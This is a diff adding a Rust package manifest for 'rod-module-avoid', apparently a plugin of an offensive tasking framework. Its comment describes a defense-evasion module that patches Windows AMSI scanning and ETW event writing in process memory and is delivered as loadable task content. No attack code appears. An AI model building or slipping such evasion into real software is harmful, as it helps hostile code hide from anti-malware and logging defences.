@@ -1,0 +1,24 @@
+[package]
+name = "rod-module-avoid"
+version = "1.0.0"
+edition = "2021"
+
+# The defense-evasion family's first module (architecture.md Sec 5.4):
+# evasion.avoid, the module-layer implementation behind the kernel's
+# placeholder verb -- the target's AMSI scan and ETW write entry points
+# patched in this process's memory, one verb naming its target, idempotent
+# under a second run. The Windows half speaks kernel32 directly: a module
+# owes the loader no dependency for three functions. Built as a cdylib
+# for Windows targets and delivered as a module.load task's content.
+
+[lib]
+# rlib beside cdylib so the bin target below links the same plugin code;
+# cargo emits the rlib for internal use only, the cdylib is the artifact.
+crate-type = ["cdylib", "rlib"]
+
+[[bin]]
+name = "rod-module-avoid"
+path = "src/main.rs"
+
+[dependencies]
+rod-plugin-sdk = { path = "../../plugin-sdk" }
